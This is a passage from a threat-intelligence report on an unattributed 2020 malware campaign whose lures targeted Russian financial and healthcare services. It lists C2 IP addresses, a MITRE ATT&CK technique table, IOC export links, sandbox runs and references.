<h6>With so few samples and without the spear-phishing, this hard to totally confirm the eventual victims but by the lures show on the victims, the threat actor (TA) focus on financial and healthcare services in Russia ( Cf translated documents.). With the reference on the campaign on the malware, this probable that the TA focus others sectors before the COVID19 event. The informations and arguments on the lures are linked to world events and no specially on Russia (Zoom vulnerability), with this that hard to say if this focus on Russia or others countries.</h6>

<h6>By hunting, two following IP, have been found, the maldoc on the financial services use cloudflare as cdn for sharing and command the operation, in adding SSL support make harder the detection of the intrusion. The latest sample, host on IP and the domain checking on google for the test of the connectivity, both use Apache/2.4.25 on Debian as web server.</h6>

|IP|Route|ASN|Organization|Country|City|Coordinates|
|:--:|:--:|:--:|:--:|:--:|:--:|:--:|
|136.244.67.59|136.244.64.0/20|AS20473 Choopa, LLC|Vultr Holdings, LLC (vultr.com)|United Kingdom|London|51.5085,-0.1257|
|95.179.252.217|95.179.240.0/20|AS20473 Choopa, LLC|Hanauer Landstraße 302 (vultr.com)|Germany|Offenbach|50.1069,8.7344|

<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker.</h6>
<center>
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Unknown/2020-04-27/Pictures/killchain.png"></img>
</center>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-04-27/Json/IOC-Unknown_2020_04-27.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-04-27/CSV/IOC-Unknown_2020_04-27.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Scripting<br>PowerShell<br>Mshta|https://attack.mitre.org/techniques/T1064<br>https://attack.mitre.org/techniques/T1086<br>https://attack.mitre.org/techniques/T1170|
|Defense Evasion|Scripting<br>Mshta|https://attack.mitre.org/techniques/T1064<br>https://attack.mitre.org/techniques/T1170|
|Discovery|Query Registry<br>System Owner/User Discovery|https://attack.mitre.org/techniques/T1012<br>https://attack.mitre.org/techniques/T1033|


<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-04-27/Json/Mitre-Unknown_2020_04-27.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/_re_fox/status/1254068520872222732](https://twitter.com/_re_fox/status/1254068520872222732) 

<h6>Translated Documents<a name="Documents"></a></h6> 

* [Рекомендации_МИР.docx](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-04-27/Lure/Lure-bank.txt)
* [Перечень_документов.docx](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-04-27/Lure/Lure-healthcare.txt)

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [57af8362ebba93155fb29af190fd450903bd62983179e5096cb24b5d0d1ea153.lnk](https://app.any.run/tasks/099295e5-2c9b-424b-8535-8be79b9b072f)
* [Перечень_документов.docx.lnk](https://app.any.run/tasks/1b789f51-a015-44a8-a026-8a2be6a6d1fb)
* [one.zip](https://app.any.run/tasks/ed9d1917-ceda-43cc-b0be-ccc884bb76d2)

<h6>Articles <a name="Articles"></a></h6>

 + [Malware analysis: decoding Emotet, part 2](https://blog.malwarebytes.com/threat-analysis/2018/06/malware-analysis-decoding-emotet-part-2/)
